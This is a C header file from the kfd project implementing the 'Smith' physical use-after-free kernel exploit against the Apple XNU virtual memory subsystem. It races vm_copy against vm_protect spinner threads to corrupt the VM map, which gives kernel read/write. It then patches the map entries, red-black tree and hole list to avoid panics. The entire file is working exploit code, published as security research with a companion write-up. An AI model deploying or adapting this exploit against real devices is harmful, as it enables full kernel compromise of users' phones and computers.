/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef smith_h
#define smith_h

/*
 * This boolean parameter determines whether the vm_map_lock() is taken from
 * another thread before attempting to clean up the VM map in the main thread.
 */
const bool take_vm_map_lock = true;

// Forward declarations for helper functions.
void smith_helper_init(struct kfd* kfd);
void* smith_helper_spinner_pthread(void* arg);
void* smith_helper_cleanup_pthread(void* arg);
void smith_helper_cleanup(struct kfd* kfd);

/*
 * This structure is allocated once in smith_init() and contains all the data
 * needed/shared across multiple functions for the PUAF part of the exploit.
 */
struct smith_data {
    atomic_bool main_thread_returned;
    atomic_int started_spinner_pthreads;
    struct {
        vm_address_t address;
        vm_size_t size;
    } vme[5];
    struct {
        pthread_t pthread;
        atomic_bool should_start;
        atomic_bool did_start;
        atomic_uintptr_t kaddr;
        atomic_uintptr_t right;
        atomic_uintptr_t max_address;
    } cleanup_vme;
};

/*
 * This function is responsible for the following:
 * 1. Allocate the singleton "smith_data" structure. See the comment above the
 *    smith_data structure for more info.
 * 2. Call smith_helper_init() which is responsible to initialize everything
 *    needed for the PUAF part of the exploit. See the comment above
 *    smith_helper_init() for more info.
 */
void smith_init(struct kfd* kfd)
{
    kfd->puaf.puaf_method_data_size = sizeof(struct smith_data);
    kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);

    smith_helper_init(kfd);
}

/*
 * This function is responsible to run the bulk of the work, from triggering the
 * initial vulnerability to achieving a PUAF on an arbitrary number of pages.
 * It is described in detail in the write-up, with a figure illustrating the
 * relevant kernel state after each step.
 */
void smith_run(struct kfd* kfd)
{
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    /*
     * STEP 1:
     */
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[2].address, smith->vme[2].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[1].address, smith->vme[1].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[0].address, smith->vme[0].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[3].address, smith->vme[3].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[4].address, smith->vme[4].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));

    /*
     * STEP 2:
     *
     * Note that vm_copy() in the main thread corresponds to substep 2A in the write-up
     * and vm_protect() in the spawned threads corresponds to substep 2B.
     */
    const u64 number_of_spinner_pthreads = 4;
    pthread_t spinner_pthreads[number_of_spinner_pthreads] = {};

    for (u64 i = 0; i < number_of_spinner_pthreads; i++) {
        assert_bsd(pthread_create(&spinner_pthreads[i], NULL, smith_helper_spinner_pthread, kfd));
    }

    while (atomic_load(&smith->started_spinner_pthreads) != number_of_spinner_pthreads) {
        usleep(10);
    }

    assert(vm_copy(mach_task_self(), smith->vme[2].address, (0ull - smith->vme[2].address - 1), 0) == KERN_PROTECTION_FAILURE);
    atomic_store(&smith->main_thread_returned, true);

    for (u64 i = 0; i < number_of_spinner_pthreads; i++) {
        /*
         * I am not sure if joining the spinner threads here will cause the
         * deallocation of their stack in the VM map. I have never ran into
         * panics because of this, but it is something to keep in mind.
         * Otherwise, if it becomes a problem, we can simply make those spinner
         * threads sleep in a loop until the main thread sends them a signal
         * that the cleanup is finished.
         */
        assert_bsd(pthread_join(spinner_pthreads[i], NULL));
    }

    /*
     * STEP 3:
     */
    assert_mach(vm_copy(mach_task_self(), smith->vme[3].address, smith->vme[3].size, smith->vme[1].address));
    memset((void*)(smith->vme[1].address), 'A', smith->vme[1].size);

    /*
     * STEP 4:
     */
    assert_mach(vm_protect(mach_task_self(), smith->vme[1].address, smith->vme[3].size, false, VM_PROT_DEFAULT));

    /*
     * STEP 5:
     */
    assert_mach(vm_copy(mach_task_self(), smith->vme[4].address, smith->vme[4].size, smith->vme[0].address));

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        kfd->puaf.puaf_pages_uaddr[i] = smith->vme[1].address + pages(i);
    }
}

/*
 * This function is responsible for the following:
 * 1. Call smith_helper_cleanup() which is responsible to patch up the corrupted
 *    state of our VM map. Technically, this is the only thing that is required
 *    to get back to a safe state, which means there is no more risk of a kernel
 *    panic if the process exits or performs any VM operation.
 * 2. Deallocate the unused virtual memory that we allocated in step 1 of
 *    smith_run(). In other words, we call vm_deallocate() for the VA range
 *    covered by those 5 map entries (i.e. vme0 to vme4 in the write-up), except
 *    for the two pages used by the kread/kwrite primitive. This step is not
 *    required for "panic-safety".
 */
void smith_cleanup(struct kfd* kfd)
{
    smith_helper_cleanup(kfd);

    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);

    vm_address_t address1 = smith->vme[0].address;
    vm_size_t size1 = smith->vme[0].size + (min_puaf_page_uaddr - smith->vme[1].address);
    assert_mach(vm_deallocate(mach_task_self(), address1, size1));

    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
    vm_size_t size2 = (smith->vme[2].address - address2) + smith->vme[2].size + smith->vme[3].size + smith->vme[4].size;
    assert_mach(vm_deallocate(mach_task_self(), address2, size2));

    /*
     * No middle block if the kread and kwrite pages are the same or back-to-back.
     */
    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
        vm_size_t size3 = (max_puaf_page_uaddr - address3);
        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
    }
}

/*
 * This function is responsible to deallocate the virtual memory for the two
 * pages used by the kread/kwrite primitive, i.e. the two pages that we did not
 * deallocate during smith_cleanup(). Once again, this step is not required for
 * "panic-safety". It can be called either if the kread/kwrite primitives no
 * longer rely on kernel objects that are controlled through the PUAF primitive,
 * or if we want to completely tear down the exploit.
 */
void smith_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr, pages(1)));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr, pages(1)));
    }
}

/*
 * This function is responsible for the following:
 * 1. If the constant "target_hole_size" is non-zero, it will allocate every
 *    hole in our VM map starting at its min_offset, until we find a hole at
 *    least as big as that value (e.g. 10k pages). The reason for that is that
 *    we will corrupt the hole list when we trigger the vulnerability in
 *    smith_run(), such that only the first hole is safe to allocate from. This
 *    is exactly what happens during a typical call to vm_allocate() with
 *    VM_FLAGS_ANYWHERE. That said, many other VM operations that modify our map
 *    entries or our hole list could cause a kernel panic. So, if it is possible
 *    at all, it is much safer to suspend all other threads running in the target
 *    process (e.g. WebContent). In that case, since we would control the only
 *    running threads during the critical section, we could guarantee that no
 *    unsafe VM operations will happen and "target_hole_size" can be set to 0.
 * 2. We need to find the VA range from which we will allocate our 5 map entries
 *    in smith_run() during step 1 (i.e. vme0 to vme4 in the write-up). Those 5
 *    map entries will cover (3X+5) pages, where X is the desired number of
 *    PUAF pages. For reasons that are explained in the write-up, we want to
 *    allocate them towards the end of our VM map. Therefore, we find the last
 *    hole that is big enough to hold our 5 map entries.
 */
void smith_helper_init(struct kfd* kfd)
{
    const u64 target_hole_size = pages(10000);
    bool found_target_hole = false;

    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    smith->vme[0].size = pages(1);
    smith->vme[1].size = pages(kfd->puaf.number_of_puaf_pages);
    smith->vme[2].size = pages(1);
    smith->vme[3].size = (smith->vme[1].size + smith->vme[2].size);
    smith->vme[4].size = (smith->vme[0].size + smith->vme[3].size);
    u64 smith_total_size = (smith->vme[3].size + smith->vme[4].size + smith->vme[4].size);

    u64 min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    /*
     * If the boolean parameter "take_vm_map_lock" is turned on, we spawn the
     * thread running smith_helper_cleanup_pthread() right here. Please see the
     * comment above smith_helper_cleanup_pthread() for more info.
     */
    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.max_address, max_address);
        assert_bsd(pthread_create(&smith->cleanup_vme.pthread, NULL, smith_helper_cleanup_pthread, kfd));
    }

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    vm_address_t vme0_address = 0;
    vm_address_t prev_vme_end = 0;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if ((kret == KERN_INVALID_ADDRESS) || (address >= max_address)) {
            if (found_target_hole) {
                vm_size_t last_hole_size = max_address - prev_vme_end;
                /*
                 * If "target_hole_size" is zero, we could instead simply set
                 * "vme0_address" to (map->max_offset - smith_total_size),
                 * after making sure that this VA range is not already mapped.
                 */
                if (last_hole_size >= (smith_total_size + pages(1))) {
                    vme0_address = (max_address - smith_total_size);
                }
            }

            break;
        }

        assert(kret == KERN_SUCCESS);

        /*
         * Quick hack: pre-fault code pages to avoid faults during the critical section.
         */
        if (data.protection & VM_PROT_EXECUTE) {
            for (u64 page_address = address; page_address < address + size; page_address += pages(1)) {
                u64 tmp_value = *(volatile u64*)(page_address);
            }
        }

        vm_address_t hole_address = prev_vme_end;
        vm_size_t hole_size = address - prev_vme_end;

        if (prev_vme_end < min_address) {
            goto next_vm_region;
        }

        if (found_target_hole) {
            if (hole_size >= (smith_total_size + pages(1))) {
                vme0_address = (address - smith_total_size);
            }
        } else {
            if (hole_size >= target_hole_size) {
                found_target_hole = true;
            } else if (hole_size > 0) {
                assert_mach(vm_allocate(mach_task_self(), &hole_address, hole_size, VM_FLAGS_FIXED));
            }
        }

next_vm_region:
        address += size;
        size = 0;
        prev_vme_end = address;
    }

    assert(found_target_hole);

    smith->vme[0].address = vme0_address;
    smith->vme[1].address = smith->vme[0].address + smith->vme[0].size;
    smith->vme[2].address = smith->vme[1].address + smith->vme[1].size;
    smith->vme[3].address = smith->vme[2].address + smith->vme[2].size;
    smith->vme[4].address = smith->vme[3].address + smith->vme[3].size;
}

/*
 * This function is ran by 4 spinner threads spawned from smith_run() in step 2.
 * It simply attempts to change the protection of virtual page zero to
 * VM_PROT_WRITE in a busy-loop, which will return KERN_INVALID_ADDRESS until
 * the main thread triggers the bad clip in vm_map_copyin_internal(). At that
 * point, vm_protect() will return KERN_SUCCESS. Finally, once the main thread
 * returns from vm_copy(), it will set "main_thread_returned" to true in order
 * to signal all 4 spinner threads to exit.
 */
void* smith_helper_spinner_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    atomic_fetch_add(&smith->started_spinner_pthreads, 1);

    while (!atomic_load(&smith->main_thread_returned)) {
        kern_return_t kret = vm_protect(mach_task_self(), 0, pages(1), false, VM_PROT_WRITE);
        assert((kret == KERN_SUCCESS) || (kret == KERN_INVALID_ADDRESS));
    }

    return NULL;
}

#define store_for_vme(kaddr) ((kaddr) ? (((kaddr) + offsetof(struct vm_map_entry, store.entry.rbe_left))) : (kaddr))
#define vme_for_store(kaddr) ((kaddr) ? (((kaddr) - offsetof(struct vm_map_entry, store.entry.rbe_left)) & (~1ull)) : (kaddr))

/*
 * This function is only ran from a thread spawned in smith_helper_init() if the
 * boolean parameter "take_vm_map_lock" is turned on. The reason why it is
 * spawned that early, instead of at the beginning of smith_helper_cleanup(), is
 * that pthread creation will allocate virtual memory for its stack, which might
 * cause a kernel panic because we have not patched the corrupted VM map state
 * yet. It sleeps for 1 ms in a loop until the main thread sets
 * "cleanup_vme.should_start" to true to signal this thread to start the
 * procedure to take the vm_map_lock(). It does so by patching the right child
 * of a map entry to point back to itself, then it sets "cleanup_vme.did_start"
 * to true to signal the main thread to start patching the state, and finally it
 * calls vm_protect(), which will take the vm_map_lock() indefinitely while
 * vm_map_lookup_entry() spins on the right child. Once the main thread has
 * finished patching up the state, it will restore the right child to its
 * original value, which will cause vm_protect() to return and this pthread to
 * exit.
 */
void* smith_helper_cleanup_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    vm_address_t max_address = atomic_load(&smith->cleanup_vme.max_address);
    vm_address_t cleanup_vme_end = 0;

    while (!atomic_load(&smith->cleanup_vme.should_start)) {
        usleep(1000);
    }

    do {
        /*
         * Find the last entry with vme_end smaller than the map's max_offset,
         * with a right child that is not null, but not the entry we are going to leak.
         */
        u64 map_kaddr = kfd->info.kaddr.current_map;
        u64 entry_kaddr = dynamic_kget(vm_map__hdr_links_prev, map_kaddr);

        while (true) {
            u64 entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
            u64 entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
            u64 entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);
            u64 entry_right = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);

            if ((entry_end < max_address) && (entry_right != 0) && (entry_start != 0)) {
                /*
                 * Patch the entry to have its right child point to itself.
                 */
                atomic_store(&smith->cleanup_vme.kaddr, entry_kaddr);
                atomic_store(&smith->cleanup_vme.right, entry_right);
                static_kset(struct vm_map_entry, store.entry.rbe_right, store_for_vme(entry_kaddr), entry_kaddr);
                cleanup_vme_end = entry_end;
                break;
            }

            entry_kaddr = entry_prev;
        }
    } while (0);

    atomic_store(&smith->cleanup_vme.did_start, true);
    vm_protect(mach_task_self(), cleanup_vme_end, pages(1), false, VM_PROT_ALL);
    return NULL;
}

/*
 * This function is responsible to patch the corrupted state of our VM map. If
 * the boolean parameter "take_vm_map_lock" is turned on, please see the comment
 * above smith_helper_cleanup_pthread() for more info. Otherwise, the rest of
 * the function simply uses the kread primitive to scan the doubly-linked list
 * of map entries as well as the hole list, and the kwrite primitive to patch it
 * up. This procedure is explained in detail in part C of the write-up.
 */
void smith_helper_cleanup(struct kfd* kfd)
{
    assert(kfd->info.kaddr.current_map);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.should_start, true);
        while (!atomic_load(&smith->cleanup_vme.did_start)) {
            usleep(10);
        }

        /*
         * Sleep an extra 100 us to make sure smith_helper_cleanup_pthread()
         * had the time to take the vm_map_lock().
         */
        usleep(100);
    }

    u64 map_kaddr = kfd->info.kaddr.current_map;

    do {
        /*
         * Scan map entries: we use the kread primitive to loop through every
         * map entries in our VM map, and record the information that we need to
         * patch things up below. There are some assertions along the way to
         * make sure the state of the VM map is corrupted as expected.
         */
        u64 entry_count = 0;
        u64 entry_kaddr = dynamic_kget(vm_map__hdr_links_next, map_kaddr);
        u64 map_entry_kaddr = map_kaddr + dynamic_info(vm_map__hdr_links_prev);
        u64 first_vme_kaddr = 0;
        u64 first_vme_parent_store = 0;
        u64 second_vme_kaddr = 0;
        u64 second_vme_left_store = 0;
        u64 vme_end0_kaddr = 0;
        u64 vme_end0_start = 0;
        u64 leaked_entry_right_store = 0;
        u64 leaked_entry_parent_store = 0;
        u64 leaked_entry_prev = 0;
        u64 leaked_entry_next = 0;
        u64 leaked_entry_end = 0;

        while (entry_kaddr != map_entry_kaddr) {
            entry_count++;
            u64 entry_next = static_kget(struct vm_map_entry, links.next, entry_kaddr);
            u64 entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
            u64 entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);

            if (entry_count == 1) {
                first_vme_kaddr = entry_kaddr;
                first_vme_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
                u64 first_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
                u64 first_vme_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
                assert(first_vme_left_store == 0);
                assert(first_vme_right_store == 0);
            } else if (entry_count == 2) {
                second_vme_kaddr = entry_kaddr;
                second_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
            } else if (entry_end == 0) {
                vme_end0_kaddr = entry_kaddr;
                vme_end0_start = entry_start;
                assert(vme_end0_start == smith->vme[1].address);
            } else if (entry_start == 0) {
                assert(entry_kaddr == vme_for_store(first_vme_parent_store));
                assert(entry_kaddr == vme_for_store(second_vme_left_store));
                u64 leaked_entry_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
                leaked_entry_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
                leaked_entry_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
                assert(leaked_entry_left_store == 0);
                assert(vme_for_store(leaked_entry_right_store) == first_vme_kaddr);
                assert(vme_for_store(leaked_entry_parent_store) == second_vme_kaddr);
                leaked_entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
                leaked_entry_next = entry_next;
                leaked_entry_end = entry_end;
                assert(leaked_entry_end == smith->vme[3].address);
            }

            entry_kaddr = entry_next;
        }

        /*
         * Patch the doubly-linked list.
         *
         * We leak "vme2b" from the doubly-linked list, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, links.next, leaked_entry_next, leaked_entry_prev);
        static_kset(struct vm_map_entry, links.prev, leaked_entry_prev, leaked_entry_next);

        /*
         * Patch "vme2->vme_end".
         *
         * The kwrite() call is just a workaround if the kwrite primitive cannot
         * overwrite 0. Otherwise, the first 4 lines can be omitted.
         */
        u64 vme_end0_start_and_next[2] = { vme_end0_start, (-1) };
        u64 unaligned_kaddr = vme_end0_kaddr + offsetof(struct vm_map_entry, links.start) + 1;
        u64 unaligned_uaddr = (u64)(&vme_end0_start_and_next) + 1;
        kwrite((u64)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(u64));
        static_kset(struct vm_map_entry, links.end, leaked_entry_end, vme_end0_kaddr);

        /*
         * Patch the red-black tree.
         *
         * We leak "vme2b" from the red-black tree, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, store.entry.rbe_parent, leaked_entry_parent_store, vme_for_store(leaked_entry_right_store));
        static_kset(struct vm_map_entry, store.entry.rbe_left, leaked_entry_right_store, vme_for_store(leaked_entry_parent_store));

        /*
         * Patch map->hdr.nentries.
         *
         * I believe this is not strictly necessary to prevent a kernel panic
         * when the process exits, but I like to patch it just in case.
         */
        u64 nentries_buffer = dynamic_kget(vm_map__hdr_nentries, map_kaddr);
        i32 old_nentries = *(i32*)(&nentries_buffer);
        *(i32*)(&nentries_buffer) = (old_nentries - 1);
        dynamic_kset(vm_map__hdr_nentries, nentries_buffer, map_kaddr);

        /*
         * Patch map->hint.
         *
         * We set map->hint to point to vm_map_to_entry(map), which effectively
         * means there is no valid hint.
         */
        dynamic_kset(vm_map__hint, map_entry_kaddr, map_kaddr);
    } while (0);

    do {
        /*
         * Scan hole list: we use the kread primitive to loop through every hole
         * entry in our VM map's hole list, and record the information that we
         * need to patch things up below. Once again, there are some assertions
         * along the way to make sure the state is corrupted as expected.
         */
        u64 hole_count = 0;
        u64 hole_kaddr = dynamic_kget(vm_map__holes_list, map_kaddr);
        u64 first_hole_kaddr = hole_kaddr;
        u64 prev_hole_end = 0;
        u64 first_leaked_hole_prev = 0;
        u64 first_leaked_hole_next = 0;
        u64 first_leaked_hole_end = 0;
        u64 second_leaked_hole_prev = 0;
        u64 second_leaked_hole_next = 0;

        while (true) {
            hole_count++;
            u64 hole_next = static_kget(struct vm_map_entry, links.next, hole_kaddr);
            u64 hole_start = static_kget(struct vm_map_entry, links.start, hole_kaddr);
            u64 hole_end = static_kget(struct vm_map_entry, links.end, hole_kaddr);

            if (hole_start == 0) {
                first_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                first_leaked_hole_next = hole_next;
                first_leaked_hole_end = hole_end;
                assert(prev_hole_end == smith->vme[1].address);
            } else if (hole_start == smith->vme[1].address) {
                second_leaked_hole_prev = static_kget(struct vm_map_entry, links.prev, hole_kaddr);
                second_leaked_hole_next = hole_next;
                assert(hole_end == smith->vme[2].address);
            }

            hole_kaddr = hole_next;
            prev_hole_end = hole_end;
            if (hole_kaddr == first_hole_kaddr) {
                break;
            }
        }

        /*
         * Patch the hole entries.
         *
         * We patch the end address of the first hole and we leak the two extra
         * holes, as explained in the write-up.
         */
        static_kset(struct vm_map_entry, links.end, first_leaked_hole_end, first_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.next, first_leaked_hole_next, first_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.prev, first_leaked_hole_prev, first_leaked_hole_next);
        static_kset(struct vm_map_entry, links.next, second_leaked_hole_next, second_leaked_hole_prev);
        static_kset(struct vm_map_entry, links.prev, second_leaked_hole_prev, second_leaked_hole_next);

        /*
         * Patch map->hole_hint.
         *
         * We set map->hole_hint to point to the first hole, which is guaranteed
         * to not be one of the two holes that we just leaked.
         */
        dynamic_kset(vm_map__hole_hint, first_hole_kaddr, map_kaddr);
    } while (0);

    if (take_vm_map_lock) {
        /*
         * Restore the entry to have its right child point to its original value.
         */
        u64 entry_kaddr = atomic_load(&smith->cleanup_vme.kaddr);
        u64 entry_right = atomic_load(&smith->cleanup_vme.right);
        static_kset(struct vm_map_entry, store.entry.rbe_right, entry_right, entry_kaddr);
        assert_bsd(pthread_join(smith->cleanup_vme.pthread, NULL));
    }
}

#endif /* smith_h */
